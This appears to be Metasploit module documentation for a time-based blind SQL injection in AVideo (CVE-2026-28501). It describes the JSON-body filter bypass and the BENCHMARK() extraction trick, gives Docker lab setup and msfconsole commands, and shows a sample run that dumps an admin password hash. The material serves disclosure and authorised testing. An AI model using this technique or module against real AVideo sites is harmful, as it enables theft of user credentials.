## Vulnerable Application

This module exploits an unauthenticated SQL injection vulnerability in AVideo's
`videos.json.php` endpoint to extract user credentials (usernames and password hashes).

**CVE ID:** CVE-2026-28501

**Affected Versions:** AVideo <= 22.0. Fixed in 24.0.

### Vulnerability Overview

The `catName` parameter is injected unsanitized into SQL queries via the `getCatSQL()` function.
A global security filter in `security.php` strips quotes from GET/POST parameters, but sending
`catName` via a JSON request body bypasses this filter because the JSON input is parsed and
merged into `$_REQUEST` after the security checks have already executed.

The module uses time-based blind SQL injection with `BENCHMARK()` to extract data.
`SLEEP()` cannot be used because the application's `sqlDAL` layer uses prepared statements
that prevent it, but `BENCHMARK()` works via a multiplication pattern that embeds the boolean
condition as a multiplier on the iteration count.

### Setup

This lab reuses the same AVideo Docker environment as the `avideo_encoder_getimage_cmd_injection`
module.

1. Clone the AVideo repository and checkout the vulnerable commit:

```bash
cd /tmp
git clone https://github.com/WWBN/AVideo.git
cd AVideo
git checkout 596df4e5b0597c9806da76ebec5bbe3b305953e4
```

2. Create a `.env` file with the following configuration:

```bash
cat > .env << EOF
SERVER_NAME=localhost
CREATE_TLS_CERTIFICATE=yes
DB_MYSQL_HOST=database
DB_MYSQL_PORT=3306
DB_MYSQL_NAME=avideo
DB_MYSQL_USER=avideo
DB_MYSQL_PASSWORD=avideo
HTTP_PORT=80
HTTPS_PORT=9443
NETWORK_SUBNET=172.99.0.0/16
EOF
```

3. Fix MariaDB corrupted tc.log issue (required for first-time setup):

```bash
cat > deploy/docker-entrypoint-mariadb << 'SCRIPTEOF'
#!/bin/bash
set -e

if [ -f /var/lib/mysql/tc.log ]; then
    MAGIC_HEADER=$(head -c 4 /var/lib/mysql/tc.log | od -An -tx1 | tr -d ' \n' 2>/dev/null || echo "")
    if [ "$MAGIC_HEADER" != "01000000" ] && [ -n "$MAGIC_HEADER" ]; then
        echo "[Entrypoint]: Removing corrupted tc.log file (bad magic header: $MAGIC_HEADER)"
        rm -f /var/lib/mysql/tc.log
    fi
fi
SCRIPTEOF
chmod +x deploy/docker-entrypoint-mariadb

cat >> Dockerfile.mariadb << 'DOCKERFILEEOF'

COPY deploy/docker-entrypoint-mariadb /usr/local/bin/docker-entrypoint-mariadb
RUN chmod +x /usr/local/bin/docker-entrypoint-mariadb
RUN sed -i '2i /usr/local/bin/docker-entrypoint-mariadb' /usr/local/bin/docker-entrypoint.sh
DOCKERFILEEOF

docker compose build database database_encoder
```

4. Start the Docker Compose environment:

```bash
docker compose up -d
```

5. Wait for the services to be ready and access the application at `http://localhost`.
   Complete the installation wizard if this is a first-time setup.

## Verification Steps

1. Start `msfconsole`
2. `use auxiliary/gather/avideo_catname_sqli`
3. `set RHOSTS <target_ip>`
4. `set RPORT <target_port>` (default: 80)
5. `run`
6. **Verify** that user credentials are extracted and displayed

## Options

### COUNT

Number of users to dump. Default: 0 (all users).

### SqliDelay

Time delay threshold for blind injection (default: 1.0 second). Lower values are faster
but may produce false positives on slow networks.

## Scenarios

### Credential dump against AVideo <= 22.0

```
msf > use auxiliary/gather/avideo_catname_sqli
msf auxiliary(gather/avideo_catname_sqli) > set RHOSTS localhost
RHOSTS => localhost
msf auxiliary(gather/avideo_catname_sqli) > set RPORT 80
RPORT => 80
msf auxiliary(gather/avideo_catname_sqli) > set COUNT 1
COUNT => 1
msf auxiliary(gather/avideo_catname_sqli) > run
[*] Running module against 127.0.0.1
[*] Running automatic check ("set AutoCheck false" to disable)
[*] {SQLi} Calibrating BENCHMARK iterations for 1.0s delay...
[*] {SQLi} Probe: 1000000 iterations took 0.127s
[*] {SQLi} Calibrated: 23622047 iterations for ~1.0s delay
[+] The target is vulnerable. Time-based blind SQLi confirmed via BENCHMARK()
[*] Dumping user credentials from the users table...
[!] Time-based blind extraction is slow (~4s per character). Be patient.
[*] {SQLi} [char 1/38] = "a"
[*] {SQLi} [char 2/38] = "d"
[*] {SQLi} [char 3/38] = "m"
[*] {SQLi} [char 4/38] = "i"
[*] {SQLi} [char 5/38] = "n"
[*] {SQLi} [char 6/38] = ";"
[*] {SQLi} [char 7/38] = "5"
...
[*] {SQLi} [char 38/38] = "9"
AVideo Users
============

    user   password
    ----   --------
    admin  5f4dcc3b5aa765d61d8327deb882cf99

[+] Loot saved to: /home/user/.msf4/loot/20260306_default_127.0.0.1_avideo.users_123456.txt
[*] Auxiliary module execution completed
```
